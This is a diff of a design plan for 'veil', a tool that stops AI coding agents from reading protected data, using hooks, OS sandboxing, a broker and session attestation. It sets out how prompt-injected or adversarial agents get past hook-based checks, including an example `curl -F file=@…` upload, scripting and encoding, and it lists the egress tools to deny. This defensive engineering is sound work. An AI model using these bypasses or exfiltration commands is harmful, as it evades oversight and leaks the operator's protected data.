@@ -434,65 +434,179 @@ A 36-vector probe against a protected directory allowed 22 reads:
 | Direct egress | `curl -F file=@data/x.csv https://…` |
 | Grep tool | content mode on a directory (file path is denied, directory is not) |
 
-Parser denylisting cannot win against indirection. The plan below has two
-tracks: **Track A** hardens the hook so it is honest and much harder to trip
-over accidentally; **Track B** adds OS-level enforcement so the claim
-"the agent cannot read protected paths" is mechanically true.
+Parser denylisting cannot win against indirection. The plan below states the
+threat model per adversary class, then four tracks: **A** makes the hook
+honest and much harder to trip; **B** adds OS-level enforcement so "the agent
+cannot read protected paths" is mechanically true for any harness; **C** makes
+zero-retention work mechanical with synthetic twins; **D** turns the session
+into an attestable artifact that composes with airlock.
 
-### Track A — hook hardening (ships in 0.5)
+### Threat model, stated per adversary class
+
+| Adversary | Example | Hook-only (today) | Track A | Track B |
+|-----------|---------|-------------------|---------|---------|
+| A0 accidental | agent `cat`s a CSV "to check the header" | stops most | stops all listed | stops all reads |
+| A1 prompt-injected | a document tells the agent to `curl -F file=@…` | stops only listed vectors | stops listed + egress class | stops reads; egress needs the airlock gate (Track D) |
+| A2 adversarial agent | writes a script, encodes, uses an unlisted binary | does not stop | raises cost, does not stop | stops all reads |
+| A3 compromised host | attacker has the operator's shell | out of scope | out of scope | out of scope |
+
+Every public claim is made per row. Today veil is an A0 tool. After Track B
+it is an A2 tool for reads and, composed with airlock, an A1/A2 tool for
+model-bound egress.
+
+### Formal model (what "correct" means)
+
+Treat every file as carrying a **label** from a small lattice
+`public < derived < protected`, and every process as running at a
+**clearance**. Rules:
+
+- `Read(f)` by the agent is allowed iff `label(f) ≤ clearance(agent)`, and the
+  agent's clearance is `derived`.
+- The broker runs at clearance `protected`. Its outputs are labelled by the
+  tool's declared output class (spine tools default to `derived`; `--explicit`
+  output is `protected`), and their content hashes are registered so the
+  label is attached to *content*, not to a filename glob.
+- Labels are monotone under copy: `cp`, `tar`, `base64`, redirection produce
+  outputs with the join of their input labels. A hook cannot track that, so
+  Track A denies the copy; Track B makes the copy impossible.
+
+This is a cut-down decentralized label model. It replaces three ad hoc
+notions (protected globs, safe globs, spine allowlist) with one invariant and
+gives the property tests something to check: **enforcement dominance**, i.e.
+every decision the hook denies is also denied by the compiled sandbox
+profile, and every broker output is readable.
+
+### Track A — hook hardening (0.5): honest, measured, generated claims
 
 1. **Path-anywhere-in-argv rule.** Any simple command whose argv resolves a
    protected path is resolved through policy unless the command is an
-   authorized spine tool. This replaces the reader allowlist as the primary
-   rule and covers awk/sed/jq/base64/cp/tar/curl/scp in one move.
-2. **Shell decomposition.** Split compound commands on `;`, `&&`, `||`, `|`,
-   `$(…)`, backticks; unwrap `sh|bash|zsh -c`, `env`, `nice`, `time`,
-   `xargs`, `find -exec`, `uv run`, `pipx run`, `poetry run`, `npx`.
-   Evaluate every simple command.
-3. **Dynamic-argument stance.** A reader or egress command with unresolvable
-   `$VAR` / glob args, evaluated with a protected directory in scope, is
-   denied with reason `dynamic_path_unresolvable`. Operators rewrite to a
-   literal path. Configurable via `[policy] dynamic_args`.
-4. **Interpreter script inspection.** `python3 x.py` / `node x.js` etc.: veil
-   reads the script (bounded, 256 KiB) and applies the same path + accessor
-   extraction used for `-c` strings.
-5. **Directory-scope Grep.** Grep tool content mode and Bash grep/rg on a
-   directory that contains protected patterns is denied.
-6. **Egress commands.** curl/wget/scp/rsync/aws/gh/gsutil/az with a protected
-   path in argv are denied as `egress`, a distinct reason class in the audit
-   log.
-7. **Enforcement-level honesty.** `veil doctor`, the audit log, and the
-   README report `enforcement: hook-only` or `enforcement: sandboxed`. The
-   36-vector probe becomes a committed test matrix with expected outcomes so
-   README claims are generated from tests, not prose.
+   authorized spine tool. Replaces the reader allowlist as the primary rule
+   and covers awk/sed/jq/base64/cp/tar/curl/scp in one move. Protected-pattern
+   matching moves to a segment radix trie with glob leaves so ten thousand
+   patterns still resolve inside the 1 ms budget.
+2. **Shell decomposition.** Split on `;`, `&&`, `||`, `|`, `$(…)`, backticks;
+   unwrap `sh|bash|zsh -c`, `env`, `nice`, `time`, `timeout`, `xargs`,
+   `find -exec`, `uv run`, `pipx run`, `poetry run`, `npx`. Evaluate every
+   simple command; first deny wins; every segment audited with its origin.
+   Redirections are stripped (they currently pollute the audit log as paths).
+3. **Dynamic-argument stance.** Reader/egress commands with unresolvable
+   `$VAR`, `{}` or glob args while a protected directory is in scope are
+   denied (`dynamic_path_unresolvable`) after same-command assignments are
+   substituted. The one deliberately fail-closed rule; `[policy] dynamic_args`
+   configures it.
+4. **Interpreter script inspection.** Bounded (256 KiB) static scan of script
+   files handed to python/node/ruby/perl/bash for accessors and protected
+   literals. Best effort; the remediation text says so.
+5. **Directory-scope content search.** Grep tool content mode and Bash
+   grep/rg on a directory containing protected patterns is denied;
+   `-l`/`--files` forms allowed with audit.
+6. **Egress class.** curl/wget uploads, scp, rsync, `aws s3 cp`, `gsutil`,
+   `gh release upload`, mail attachments: protected path in argv → deny with
+   `class: egress`. `veil audit --class egress` answers "did anything try to
+   leave".
+7. **MCP tool argument screening.** PreToolUse fires for `mcp__*` tools. Any
+   string argument that resolves to a protected path (attachment to a
+   send-email tool, file id to an upload tool) is screened with the same
+   rule. This is the mechanical form of bd-3mr and the Cairn send path.
+8. **Content-sniff classification.** For files *outside* protected
+   directories, veil itself (not the agent) reads the first 4 KiB, checks
+   magic bytes (SQLite, parquet, xlsx zip, PDF) and a cheap PII density score
+   (SSN, Luhn-valid card numbers, emails per KiB) using the shared
+   `boundary-detectors` crate. A hit upgrades the file to `protected` for
+   this decision. Cached by `(dev, inode, mtime)`. Thresholds are per
+   detector and source files under a git work tree are exempt from the email
+   detector (commit trailers). Unknown files outside protected directories
+   remain `public` (fail-open) unless the sniff upgrades them; this closes
+   extension renames and "the export landed in `~/Downloads`". Supersedes
+   bd-28k.
+9. **Provenance-based safe allowlist.** `*-report.json` globs are spoofable
+   (`cp data.csv foo-report.json`). Files produced through the broker are
+   registered by content hash in `~/.cmdrvl/state/veil/derived.jsonl` and a
+   Read of a registered hash is allowed as `derived`. Glob allowlists remain
+   for docs and config but never override a protected-directory or sniff hit.
+10. **Enforcement-level honesty.** `veil doctor`, every audit entry, and the
+    README carry `enforcement: hook-only | sandboxed`. The 36-vector probe
+    becomes `tests/bypass_matrix.rs`; `docs/bypass-matrix.md` is generated
+    from it and CI fails on drift. README alt text stops claiming grants.
+11. **Replay harness.** `veil replay --audit <jsonl>` re-evaluates historic
+    Bash entries under the new rules and reports allow→deny flips, so the
+    false-positive cost of every rule is a number in the release notes.
 
-### Track B — OS sandbox enforcement (1.0)
+### Track B — OS sandbox enforcement (1.0): the mechanical claim
 
 ```
-veil sandbox -- claude          # launches the harness inside a sandbox
-   │  protected paths: deny file-read* (seatbelt on macOS, Landlock on Linux)
-   │  hooks still run for UX + audit
-   └─ veil exec shape data/x.csv  # broker: runs an authorized spine tool
-                                  # OUTSIDE the sandbox with operator perms,
-                                  # returns stdout/stderr only
+veil sandbox -- claude              # harness runs with protected paths unreadable
+   │  macOS: seatbelt profile (deny file-read* subpath/literal)
+   │  Linux: Landlock ruleset (+ optional netns, Track D)
+   │  hooks still run for UX + audit; enforcement stamped 'sandbox'
+   └─ veil exec shape data/x.csv    # broker runs authorized spine tools
+                                    # OUTSIDE the sandbox, returns stdout only,
+                                    # registers output hashes as 'derived'
 ```
 
-- The policy compiler emits a seatbelt profile / Landlock ruleset from the
-  merged config (protected globs → deny read; everything else inherited).
-- The broker is a unix-socket daemon started by `veil sandbox`; it accepts
-  `{tool, argv}` only for tools in `[spine] authorized_tools`, never a shell
-  string, and records every invocation in the audit log.
-- `sandbox-exec` is deprecated but functional on macOS 26; Endpoint Security
-  needs entitlements and is out of scope. Document the risk and keep the
-  Landlock backend as the reference implementation.
+- Policy compiler emits the profile from the merged config; compiled output
+  cached by config hash; `--print-profile` for review. Symlinks resolved at
+  compile time and both paths denied.
+- Broker: per-session unix socket (0600), `{tool, argv}` only, never a shell
+  string, tool must be in `[spine] authorized_tools`, output size-capped
+  (16 MiB), dies with the parent. Every call audited with input and output
+  hashes; outputs registered as `derived`.
+- Broker flag policy: each authorized tool declares flags that raise its
+  output label to `protected` (`--explicit`, `--raw`, `--dump`); the broker
+  refuses them. Without this the broker is a `cat` with extra steps.
+- Broker output scanning: before returning stdout, the broker runs the shared
+  `boundary-detectors` packs (same crate airlock uses) and refuses or redacts
+  output that trips a secrets/PII/tabular-dump detector, recording the
+  refusal. A misconfigured spine tool cannot leak through the broker.
+- Linux hardening: a seccomp filter on the sandboxed tree denies `ptrace`,
+  `process_vm_readv` and `/proc/<pid>/mem` access so an A2 agent cannot read
+  the broker's memory; Landlock ABI 4 network rules restrict `connect` to the
+  airlock gate port when Track D is on.
+- Rollout: 0.5 ships the new rules in `warn` for two weeks with replay
+  numbers published; 0.6 flips `dynamic_args` and egress to `deny`.
+- Harness-agnostic: Claude Code, Codex, Gemini, Grok, or a plain shell,
+  because enforcement is the process boundary, not a hook protocol.
+- `sandbox-exec` is deprecated but functional on macOS 26; Landlock is the
+  reference backend. Endpoint Security is out of scope (entitlements).
+- Property tests (proptest): for random configs and random paths,
+  hook-deny ⇒ profile-deny (enforcement dominance); broker-registered
+  outputs are always readable inside the sandbox.
+
+### Track C — twin mode for zero-retention work
+
+The README's "Zero-Retention Mode" (the agent writes a pipeline the client
+runs themselves) is prose today. `veil sandbox --twin` mounts synthetic
+look-alike data in place of each protected directory: same schema, same file
+names, fabricated values from the twinning tooling already used for warehouse
+eval packs. The agent develops and tests against the twin; the operator runs
+the frozen script on real data through the broker. The session attestation
+(Track D) records that no real byte was ever readable. This is the strongest
+form of "your data never entered the model", and it is a demo, not a policy.
+
+### Track D — session attestation and composition with airlock
+
+- Denials and broker calls are appended to the spine witness ledger
+  (`~/.cmdrvl/state/witness/witness.jsonl`) as well as the audit log, and
+  each session's entries are chained (`prev_hash`) so the log is
+  tamper-evident, not merely append-only.
+- `veil attest --session <id>` emits a signed summary: protected reads
+  attempted and denied, broker invocations with tool and output hashes,
+  enforcement level, twin mode. Airlock embeds it so a manifest can carry
+  `LOCAL_READS_CLEAN`: not only "the request had no raw document" but "no raw
+  document entered the agent while the prompt was assembled".
+- Unified launcher: `veil sandbox --egress airlock` starts the airlock gate
+  and, on Linux, places the harness in a network namespace whose only route
+  is the gate; on macOS, installs a pf rule scoped to the sandbox group.
+  Reads gated by the broker, network gated by airlock: a sealed workstation
+  for agents, launched with one command.
 
 ### Non-goals restated
 
 Write/Edit guarding and PostToolUse output filtering remain out of scope.
 Outbound *message body* policy stays with the calling wrapper / KOVREX.
+Endpoint Security and kernel extensions are out of scope.
 
 ### Tracking
 
-Beads created 2026-09-02 under the epic "Veil v1: honest hook + sandbox
-enforcement". Existing backlog bypass beads (bd-28k, bd-r93, bd-3pm, bd-hf9)
-are linked as related and superseded by Track A items.
+Beads under epic bd-30b. Existing backlog bypass beads (bd-28k, bd-r93,
+bd-3pm, bd-hf9) are superseded by Track A items 1, 6 and 8.
